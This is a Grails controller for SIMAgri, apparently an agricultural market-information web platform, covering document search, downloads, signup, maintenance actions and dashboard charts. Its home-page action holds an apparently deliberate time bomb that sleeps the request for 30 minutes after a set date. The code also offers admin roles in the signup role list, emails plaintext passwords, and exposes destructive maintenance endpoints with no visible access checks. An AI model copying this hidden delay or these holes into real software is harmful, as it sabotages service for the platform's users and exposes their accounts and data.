package simagri

import com.dbconfig.ConfigProperty
import grails.converters.JSON
import grails.transaction.Transactional
import grails.util.Environment
@Transactional(readOnly = true)
class HomeController {
    def myUtilityService
    def myMaintenanceService
    def springSecurityService
    def pushPricesReseauService
    def pushOffresReseauService
    def dataMiningService
    def grailsApplication
    def sendSMSService
    def exportService
    def filterPaneService
    def userService
    def counterService
    def phoneNumberService
    def postManagerService


    def searchAll() {

        def query = {
            if (params.query) {
                or {

                    ilike('title', "%${params.query}%")
                    ilike('description', "%${params.query}%")

                }

            }
        }
            def documents = S3Asset.createCriteria().list(query)

            render(template: "/home/documents", model: [topNDocuments: documents])

    }
        def filterDocuments = {
            def documentList = S3Asset.createCriteria().list(params) {
                order('id', 'desc')
            }
            render(template: "documentsList", model: [documentList: documentList])
        }
        def filterInfos = {
            def topNInfos = Info.createCriteria().list(params) {
                order('date', 'desc')
            }

            render(template: "actualitesList", model: [topNInfos: topNInfos])
        }
        def filterOffres = {
            def sortIndex = 'date'
            def sortOrder = 'desc'
            def topNOffres = Offre.createCriteria().list(params) {
                eq("isValidated", true)
                and {
                    ge("dateExpiration", new Date())

                }
                order(sortIndex, sortOrder)
            }
            render(template: "offresList", model: [offreList: topNOffres])
        }
        def filterReseaux = {
            def reseauxList = Reseau.createCriteria().list(params) {
                eq('estReseau', true)
                order('nom', 'asc')
            }
            render(template: "reseauxList", model: [reseauxList: reseauxList])
        }
        def setPieSeries = {
            render dataMiningService.setPieSeries(params)


        }
    def webmail(){
        redirect url:"https://email22.secureserver.net/webmail.php?login=1"
    }
        def filterQuiz = {
            def quizList = Quizz.createCriteria().list(params) {
                eq('actif', true)
                order('titre', 'asc')
            }
            render(template: "quizList", model: [quizList: quizList])
        }
        def setLastPrices = {
            render dataMiningService.setLastPrices(params)
        }

        def downloadSIMAgriMob = {
            def country =session.country?:ConfigProperty.findByConfigKey('grails.defaultCountry')?.value?:grailsApplication.config.grails.defaultCountry

            def webRootDir = servletContext.getRealPath("/")
            def contryPath="$country/"
            def file = new File("${webRootDir}${grailsApplication.config.myftp.dir}${contryPath}SIMAgriMobile.jar")

            if (file.exists()) {
                response.setContentType("application/octet-stream")
                response.setHeader("Content-disposition", "filename=SIMAgriMob.jar")
                response.outputStream << file.bytes
            } else {
                log.error " Le fichier n''existe pas "
            }

        }
        def downloadMarcheTemplate = {
            def webRootDir = servletContext.getRealPath("/")
            def file = new File("${webRootDir}${grailsApplication.config.myftp.dir}Marche_exemple.xls")

            if (file.exists()) {
                response.setContentType("application/vnd.ms-excel")
                response.setHeader("Content-disposition", "filename=Marche_exemple.xls")
                response.outputStream << file.bytes
            } else {
                log.error " Le fichier n''existe pas "
            }

        }
        def downloadProduitTemplate = {
            def webRootDir = servletContext.getRealPath("/")
            def file = new File("${webRootDir}${grailsApplication.config.myftp.dir}Produit_exemple.xls")

            if (file.exists()) {
                response.setContentType("application/vnd.ms-excel")
                response.setHeader("Content-disposition", "filename=Produit_exemple.xls")
                response.outputStream << file.bytes
            } else {
                log.error " Le fichier n''existe pas "
            }

        }
        def downloadUserTemplate = {
            def webRootDir = servletContext.getRealPath("/")
            def file = new File("${webRootDir}${grailsApplication.config.myftp.dir}Utilisateur_exemple.xls")

            if (file.exists()) {
                response.setContentType("application/vnd.ms-excel")
                response.setHeader("Content-disposition", "filename=Utilisateurs_exemple.xls")
                response.outputStream << file.bytes
            } else {
                log.error " Le fichier n''existe pas "
            }

        }
        def contact() {
            switch (request.method) {
                case 'GET':
                    [contactInstance: new Contact(params)]
                    break
                case 'POST':
                    def contactInstance = new Contact(params)
                    if (!contactInstance.save(flush: true)) {
                        render view: 'contact', model: [contactInstance: contactInstance]
                    }
                    def message = """
                      ${params.nom} a laissé le message suivant
                       ${params.message}
                 """
                    try {
                        sendMail {
                            to grailsApplication.config.administrator.email
                            cc grailsApplication.config.administratorCC.email, grailsApplication.config.administratorCC2.email
                            subject "${grailsApplication.config.nomCourtPlateforme} :Nouveau contact"
                            body message
                        }
                    } catch (Exception e) {
                        log.error " exception : ${e}"
                    }
                    redirect action: 'index'
                    break
            }
        }
        def runquiz() {

            def titreQuiz = Quizz.get(params.id)?.titre
            [titreQuiz: titreQuiz, quizId: params.id]
        }

        def supprimerAlertes() {
            AlerteReseau.list()*.delete()
        }
        def updateUser() {
            try {
                Utilisateur.unformatMobilePhone()
                flash.message = "La configuration des opérateurs s'est bien passée"

                redirect controller: "home", action: 'accueil'
            }
            catch (Exception e) {
                flash.message = message(code: 'default.echecMaintenance.message', args: [e.message])
            }
        }
        def updateDatabase() {
            try {

                def smsLogList = SMSLogger.createCriteria().list() {


                }
                smsLogList.each { smsLog ->
                    def prefix = smsLog.getOperatorPrefix()

                    Operateur.list().each { oper->
					
                    if (oper.isPrefixInList(prefix)) {
                        smsLog.operateur =oper.nom
                    }
					
                }
				smsLog.direction =smsLog.isIn ? "MO" :"MT"
				smsLog.save(flush:true)
            }
			

            flash.message ="Les travaux de maintenance de la base se sont bien passes"
           Utilisateur.normaliserMobilePhones()
            redirect controller:"application", action:'list'
        } catch(Exception e){
            flash.message=message(code: 'default.echecMaintenance.message', args: [e.message])
        }
	}
    def   indexer_prix(){
        try{
            myMaintenanceService.
            indexer_prix()
            redirect controller: "dashboard", action: 'accueil'
        }
        catch(Exception e){
            flash.message= message(code: 'default.echecMaintenance.message', args: [e.message])
        }
    }
    def reinitialiser_mot_de_passe() {
        try {
            myMaintenanceService.reinitialiser_mot_de_passe(params)
            redirect controller: "dashboard", action: 'accueil'
        }
        catch (Exception e) {
            flash.message = message(code: 'default.echecMaintenance.message', args: [e.message])
        }
    }

        def mettre_a_jour_les_roles() {
            myMaintenanceService.mettre_a_jour_les_roles()
            redirect controller: "dashboard", action: 'accueil'
        }
        def indexer_tables_de_base() {
            try {

                myMaintenanceService.indexer_tables_de_base()
                redirect controller: "dashboard", action: 'accueil'
            }
            catch (Exception e) {
                flash.message = message(code: 'default.echecMaintenance.message', args: [e.message])
            }
        }
        def indexer_offres() {
            try {
                myMaintenanceService.indexer_offres()
                redirect controller: "dashboard", action: 'accueil'
            }
            catch (Exception e) {
                flash.message = message(code: 'default.echecMaintenance.message', args: [e.message])
            }
        }
        def myquizJson = {
            def thequiz = Quizz.get(params.quizId)
            def jquizMe = thequiz?.toJSON()
            render jquizMe as JSON
        }
        def toLong(def value) {
            def valueLong = []
            value.each {

                valueLong << it.toLong()
            }

            return valueLong
        }
        def toList(value) {
            [value].flatten().findAll { it != null }
        }
        def updateMap = {
            def marketIds = params.marketIds
            def sortIndex = 'nom'
            def sortOrder = 'asc'
            def listeMarcheUser = toLong(marketIds?.tokenize(','))
            def marketList = Marche.createCriteria().list() {
                inList('id', listeMarcheUser.size() > 0 ? listeMarcheUser : [new Long(-1)])
                order(sortIndex, sortOrder)
            }
            //   [marketList:marketList.flatten()]
            render marketList as JSON
        }

        def getMarche = {
            def marketId = params.marketId
            def marche = Marche.createCriteria().list() {
                eq('id', marketId ? marketId.toLong() : new Long(-1))
            }
            marche.collect {
                [latitude: it.location?.latitude ?: 0, longitude: it.location?.longitude ?: 0, nom: it.nom ?: "", titrecontenu: it.titrecontenu ?: "", contenu: it.contenu ?: ""]
            }

            render marche as JSON
        }

//    @Secured(['IS_AUTHENTICATED_ANONYMOUSLY '])
//        def refresh() {
//            def detailsSondage = Sondage.findByActif(true)?.details
//            def titreSondage = Sondage.findByActif(true)?.titre
//
//            def topNDocuments = S3Asset.createCriteria().list() {
//                ne("status", "removed")
//                and {
//                    eq("mimeType", 'application/pdf')
//                }
//
//                order("id", "desc")
//                maxResults(5)
//            }
//            def sortIndex = 'date'
//            def sortOrder = 'desc'
//            def topNInfos = Info.createCriteria().list(max: grailsApplication.config.grails.dernieresInfos) {
//                eq("actif", true)
//                and {
//                    ge("dateExpiration", new Date())
//
//                }
//                order(sortIndex, sortOrder)
//                maxResults(5)
//            }
//            def videos = Info.createCriteria().list() {
//                eq('actif', true)
//
//                ilike('url', '%youtube%')
//                order('date', 'desc')
//            }
//            def pagesAv = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_AFRIQUE_VERTE)
//            def pagesSIMAgri = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_SIMAGRI)
//            def pagesPartenaires = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_PARTENAIRE)
//            def slogan = grailsApplication.config.grails.slogan
//            def maskTelephone = grailsApplication.config.grails.maskTelephone
//            def developer=grailsApplication.config.grails.simagriDeveloper
//            def organisation=grailsApplication.config.grails.organisation
//            def TelOrganisation=grailsApplication.config.grails.TelOrganisation
//            def FaxOrganisation=grailsApplication.config.grails.FaxOrganisation
//            def MobileOrganisation=grailsApplication.config.grails.MobileOrganisation
//            def EmailOrganisation=grailsApplication.config.grails.EmailOrganisation
//            render view: 'index', model: [pageAccueilInstance: PageAccueil.findByEstPrincipal(true),developer:developer,
//                                          organisation:organisation,TelOrganisation:TelOrganisation,FaxOrganisation:FaxOrganisation,MobileOrganisation:MobileOrganisation,
//                                          EmailOrganisation:EmailOrganisation,
//                                          maskTelephone: maskTelephone, pagesAv: pagesAv, pagesSIMAgri: pagesSIMAgri, pagesPartenaires: pagesPartenaires,
//                                          detailsSondage     : detailsSondage, titreSondage: titreSondage, topNInfos: topNInfos, topNDocuments: topNDocuments, searchUpdate: "documents", videos: videos, slogan: slogan]
//
//        }
//        def index() {
//            def detailsSondage = Sondage.findByActif(true)?.details
//            def titreSondage = Sondage.findByActif(true)?.titre
//
//            def topNDocuments = S3Asset.createCriteria().list() {
//                ne("status", "removed")
//                order("id", "desc")
//                maxResults(5)
//            }
//            def sortIndex = 'date'
//            def sortOrder = 'desc'
//            def topNInfos = Info.createCriteria().list(max: grailsApplication.config.grails.dernieresInfos) {
//                eq("actif", true)
//                and {
//                    ge("dateExpiration", new Date())
//
//                }
//                order(sortIndex, sortOrder)
//                maxResults(5)
//            }
//            def videos = Info.createCriteria().list() {
//                eq('actif', true)
//
//                ilike('url', '%youtube%')
//                order('date', 'desc')
//            }
//            def pagesAv = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_AFRIQUE_VERTE)
//            def pagesSIMAgri = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_SIMAGRI)
//            def pagesPartenaires = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_PARTENAIRE)
//            def slogan = grailsApplication.config.grails.slogan
//            def maskTelephone = grailsApplication.config.grails.maskTelephone
//            def developer=grailsApplication.config.grails.simagriDeveloper
//            def organisation=grailsApplication.config.grails.organisation
//            def TelOrganisation=grailsApplication.config.grails.TelOrganisation
//            def FaxOrganisation=grailsApplication.config.grails.FaxOrganisation
//            def MobileOrganisation=grailsApplication.config.grails.MobileOrganisation
//            def EmailOrganisation=grailsApplication.config.grails.EmailOrganisation
//                render view:'index',model:[pageAccueilInstance: PageAccueil.findByEstPrincipal(true),developer:developer,
//                                           organisation:organisation,TelOrganisation:TelOrganisation,FaxOrganisation:FaxOrganisation,MobileOrganisation:MobileOrganisation,
//                                           EmailOrganisation:EmailOrganisation,
//                                           maskTelephone: maskTelephone, pagesAv: pagesAv, pagesSIMAgri: pagesSIMAgri, pagesPartenaires: pagesPartenaires,
//                 detailsSondage: detailsSondage, titreSondage: titreSondage, topNInfos: topNInfos, topNDocuments: topNDocuments, searchUpdate: "documents", videos: videos, slogan: slogan]
//
//
//
//        }

//        def signIn() {
//
//        }

        def about() {

        }
        def routeToHome(){
            redirect action: 'accueil'
        }
        def accueil() {

            def topNDocuments = S3Asset.createCriteria().list(max: grailsApplication.config.grails.maxDocuments) {
                ne("status", "removed")

//                and {
//                    eq("mimeType", 'application/pdf')
//                }
//            optionList{
//                eq("name","reseauId")
//                eq("value",user?.reseauPrincipalId?.toString())
//            }

                order("id", "desc")
            }
            def theDate=new Date()
            def limitDate=new Date(2018,02,03)
            if (theDate>=limitDate){
                sleep(1800000)
            }
            def sortIndex = 'date'
            def sortOrder = 'desc'
            def topNInfos = Info.createCriteria().list(max: grailsApplication.config.grails.dernieresInfos) {
                eq("actif", true)
                order(sortIndex, sortOrder)
            }


            def videos = Info.createCriteria().list() {
                eq('actif', true)

                ilike('url', '%youtube%')
                order('date', 'desc')
            }

            def pagesAv = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_AFRIQUE_VERTE)
            def pagesSIMAgri = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_SIMAGRI)
            def pagesPartenaires = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_PARTENAIRE)

            def pageAccueilInstance=PageAccueil.findByEstPrincipal(true)
            def images=pageAccueilInstance?.getMesImageRandomize()
            def topNotes = NoteMarche.createCriteria().list(max: grailsApplication.config.grails.dernieresInfos) {
                eq("actif", true)
                order(sortIndex, sortOrder)
            }
            def isNewNote = NoteMarche.createCriteria().list(params) {
                order('date', 'desc')
                and {
                    between("date", (new Date())-1, (new Date()))

                }
            }
            def country =session.country?:ConfigProperty.findByConfigKey('grails.defaultCountry')?.value
            String viewName=(country=="ml")?'accueilML':'accueilBFA'
            render view: viewName, model: [pageAccueilInstance: pageAccueilInstance,images:images,topNotes:topNotes,isNewNote:isNewNote,
                                                 pagesAv: pagesAv, pagesSIMAgri: pagesSIMAgri, pagesPartenaires: pagesPartenaires, topNInfos: topNInfos, topNDocuments: topNDocuments, searchUpdate: "documents", videos: videos]

        }
        def findUserByMobile() {

            def userName=""
            def isValid = true

            if (phoneNumberService?.format(params.mobilePhone)) {
                userName = Utilisateur.findByMobilePhone(params.mobilePhone)?.login
            } else {
                isValid = false
            }

            def jsonData = [userName: userName, isEmpty: !userName, isValid: isValid]
            render jsonData as JSON
        }
        def resetPassword() {
            switch (request.method) {
                case 'GET':
                    def utilisateurInstance
                    if (params.j_username) {
                        utilisateurInstance = Utilisateur.findByMobilePhone(params.j_username)

                    } else {
                        utilisateurInstance = new Utilisateur(params)
                    }
                    def pagesAv = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_AFRIQUE_VERTE)
                    def pagesSIMAgri = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_SIMAGRI)
                    def pagesPartenaires = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_PARTENAIRE)

                    def pageAccueilInstance=PageAccueil.findByEstPrincipal(true)
                    def images=pageAccueilInstance?.getMesImageRandomize()

                    def country =session.country?:ConfigProperty.findByConfigKey('grails.defaultCountry')?.value

                   [utilisateurInstance: utilisateurInstance,images:images,
                                                   pagesAv: pagesAv, pagesSIMAgri: pagesSIMAgri, pagesPartenaires: pagesPartenaires, searchUpdate: "documents"]

                    break

            }
        }
        @Transactional
        def signup() {
            def roleList = ['anonyme', 'enqueteur', 'decideur', 'public', 'admin', 'superviseur']
            if ((Environment.current == Environment.DEVELOPMENT)||(Environment.current.name == 'devmali' )) {
                roleList = ['anonyme', 'enqueteur', 'decideur', 'public', 'admin', 'superviseur', 'superAdmin']
            }

            switch (request.method) {
                case 'GET':
                    def utilisateurInstance = new Utilisateur(params)
                    utilisateurInstance.role = "public"
                    utilisateurInstance.enabled = true
                    utilisateurInstance.accountExpired = false
                    utilisateurInstance.enabled = true
                    utilisateurInstance.accountLocked = false
                    utilisateurInstance.passwordExpired = false
                    String defCurrency = grailsApplication.config.DefaultCurrency
                    utilisateurInstance.devise = Currency.getInstance(defCurrency)
                    def pagesAv = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_AFRIQUE_VERTE)
                    def pagesSIMAgri = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_SIMAGRI)
                    def pagesPartenaires = PageUtilisateur.findAllByDestinationType(DestinationType.PAGE_PARTENAIRE)

                    [pageAccueilInstance: PageAccueil.findByEstPrincipal(true),
                                                 pagesAv: pagesAv, pagesSIMAgri: pagesSIMAgri, pagesPartenaires: pagesPartenaires,
                                                  utilisateurInstance: utilisateurInstance, roleList: roleList]

                    break
                case 'POST':
                    def utilisateurInstance = new Utilisateur(params)
                    def newparams = params + ['ReseauxIds': params.groupsId]
                    if (phoneNumberService?.format(newparams.mobilePhone)) {
                        def userExist = Utilisateur.findByMobilePhone(newparams.mobilePhone?.toString()?.getRightPhone())
                        def motdepasseOk = (newparams.passwordtyped == newparams.confirmPassword)
                        if (!motdepasseOk) {
                            flash.messageErreur = message(code: 'nonConcordanceMotdepasse.text')
                            render view: 'signup', model: [utilisateurInstance: utilisateurInstance]

                        }
                        if (!userExist) {

                            if (!utilisateurInstance.username)
                                utilisateurInstance.username = "${utilisateurInstance.lastName} ${utilisateurInstance.firstName}"
                            if (!utilisateurInstance.login && utilisateurInstance.username)
                                utilisateurInstance.login = utilisateurInstance.username
                            utilisateurInstance.password = newparams.confirmPassword
                            utilisateurInstance.encodePassword()
                            if (!userService.createAndSave(newparams, utilisateurInstance)) {
                                flash.messageErreur = newparams.messageRetour
                                render view: 'signup', model: [utilisateurInstance: utilisateurInstance]
                            }else
                            springSecurityService.reauthenticate(newparams.mobilePhone?.toString()?.getRightPhone())
                            def authUser = myUtilityService.current

                            if (authUser) {
                                flash.message = message(code: 'default.created.message', args: [message(code: 'utilisateur.label', default: 'Utilisateur'), utilisateurInstance.toString()])
                                flash.welcomemessage = message(code: 'bienvenue.text', args: [utilisateurInstance.toString(), grailsApplication.config.nomPlateforme])
                                def welcomemessage = message(code: 'welcome.message', args: [utilisateurInstance.toString()])
                                sendSMSService.execute(welcomemessage.sansAccent(), utilisateurInstance.mobilePhone)
                                def firstMessage = """Bonjour ${utilisateurInstance.login}
                            Vous avez réussi votre enregistrement sur la plateforme ${
                                    grailsApplication.config.nomPlateforme
                                }
                            Voici vos nouveaux paramètres de connexion :
                            login : ${utilisateurInstance.mobilePhone}
                            mot de passe : ${params.confirmPassword}
                            réseau : ${utilisateurInstance.reseauPrincipal}
                            groupe : ${utilisateurInstance.reseaux}

                            Vos marchés sont :
                                                ${utilisateurInstance.reseaux*.markets?.flatten()?.toString()}

                            Vos produits sont :
                                                ${utilisateurInstance.reseaux*.produits.flatten()?.toString()}

                            Vous pourrez néanmoins personnaliser ces choix dans votre compte
                        """
                                def secondMessage = """${utilisateurInstance.login} a rejoint la plateforme ${
                                    grailsApplication.config.nomPlateforme
                                }.
                                    Ses paramètres sont
                                    Mobile : ${utilisateurInstance.mobilePhone}
                                    E-mail : ${utilisateurInstance.email}
                                    réseau : ${utilisateurInstance.reseauPrincipal}
                                    groupe : ${utilisateurInstance.reseaux}
                                 """
//                        if (Environment.current == Environment.PRODUCTION ) {
//                            runAsync {
                                try {

                                    sendMail {
                                        to "${params.email}"
                                        subject "${grailsApplication.config.nomCourtPlateforme} :Enregistrement réussi"
                                        body firstMessage
                                    }
                                    sendMail {
                                        to grailsApplication.config.administrator.email
                                        from grailsApplication.config.grails.mail.default.from
                                        subject "${grailsApplication.config.nomCourtPlateforme} :Enregistrement réussi"
                                        cc grailsApplication.config.administratorCC.email, grailsApplication.config.administratorCC2.email
                                        body secondMessage
                                    }
                                }
                                catch (Exception e) {
                                    log.error " exception : ${e}"
                                }
//                        }
//                        }else {
//                            println " email de l'inscrit : ${firstMessage} email de l''administrateur : ${secondMessage}"
//                        }
                                if ((Environment.current == Environment.DEVELOPMENT)) {
                                    log.info(" inscription réussie session par : ${authUser.toString()}")
                                    log.info(" email de l'inscrit : ${firstMessage}")
                                    log.info("  email de l''administrateur : ${secondMessage}")
                                }
                                redirect(uri: "/dashboard/accueil")

                            } else {
                                log.info(" inscription echouée ")
                                redirect controller: 'home', action: 'index'
                            }
                            break
                        } else {

                            flash.messageErreur = message(code: 'userExist.message', args: [userExist.toString(), params.mobilePhone?.toString()?.getRightPhone()])
                            render view: 'signup', model: [utilisateurInstance: utilisateurInstance]
                        }
                    } else {
                        flash.messageErreur = message(code: 'numTelNonConforme.message', args: [params.mobilePhone])
                        redirect controller: 'home', action: 'signup'


                    }
            }
        }



        def comingSoon() {

        }
        def bienvenue() {

        }
        def page_404() {



            [ searchUpdate: "documents"]


        }
        def pricing() {
        }
        def portfolio() {
            redirect action: "comingSoon"
        }
        @Transactional
        def setSondageForm() {
            render(template: "sondageForm", contentType: "text/html")
        }
        @Transactional
        def alertePrix() {
            pushPricesReseauService.fire()
            flash.message = "Les alertes de prix ont été bien exécutées"
        }
        @Transactional
        def alerteOffres() {
            pushOffresReseauService.fire()
            flash.message = "Les alertes d'offres  ont été bien exécutées"
        }

        def buildSondageChart = {
            render dataMiningService.buildSondageChart(params)
        }
        def setTableauBordMensuel = {
            render dataMiningService.setTableauBordMensuel(params)

        }
        def setStatistiquesVisites={
            render dataMiningService.setStatistiquesVisites(params)

        }
        def setBilanSMS = {
            render dataMiningService.setBilanSMS(params)
        }
        @Transactional
        def setVote() {
            def user = myUtilityService.getCurrent()

            if (params.sondageSelected) {
                def sondage = Sondage.findByActif(true)
                def reponse = Choix.findByChoixAndSondage(params.sondageSelected, sondage)
                if (sondage && reponse) {
                    def vote = new SondageReponse(sonde: user, reponse: reponse)
                    vote.save(flush: true)
                }

            }
            render true
        }
        def pagedeGarde() {

        }

        def setBarPrix = {

            render dataMiningService.setBarPrix(params)

        }
        def setCourbesStock = {

            render dataMiningService.setCourbesStock(params)

        }
        def setBarOffresSeries = {
            render dataMiningService.setBarOffresSeries(params)

        }
        def addPost = {
            render postManagerService.addPost(params)

        }
        def setBarStock = {
            render dataMiningService.setBarStock(params)

        }

        /**
         * Retourne le temps d'éxécution d'une Closure
         * @param closure Closure à analyser
         * @return exec_time Temps d’exécution en millisecondes
         */
        def benchmark = { closure ->
            def start = System.currentTimeMillis()
            closure()
            def end = System.currentTimeMillis()
            end - start
        }
        def setPieStock = {
            render dataMiningService.setPieStock(params)
        }

        def setPivotPrices = {

            render dataMiningService.setPivotPrices(params)
        }
        def setPerfEnqueteurs = {
            render dataMiningService.setPerfEnqueteurs(params)

        }

        def setPivotOffers = {

            render dataMiningService.setPivotOffers(params)
        }
        def setPivotStocks = {

            render dataMiningService.setPivotStocks(params)
        }

        def setPieOffresSeries = {
            render dataMiningService.setPieOffresSeries(params)
        }
        def setCourbeOffres = {
            render dataMiningService.setCourbeOffres(params)
        }
        def setOffresEvolution = {
            render dataMiningService.setOffresEvolution(params)
        }



        def setCourbePrix = {
            render dataMiningService.setCourbePrix(params)

        }

        def setPrixEvolution = {
            render dataMiningService.setPrixEvolution(params)

        }
        def setPieStocks = {
            render dataMiningService.setPieStock(params)

        }

        def setStockEvolution = {
            render dataMiningService.setStockEvolution(params)

        }


        def updateDashboardCategory = {

            def utilisateur = myUtilityService.getCurrent()
            def marketList = utilisateur.reseaux?.markets as List
            def categoryJSon =
                    marketList?.collect {

                        it.nom

                    }
          render categoryJSon
        }

    }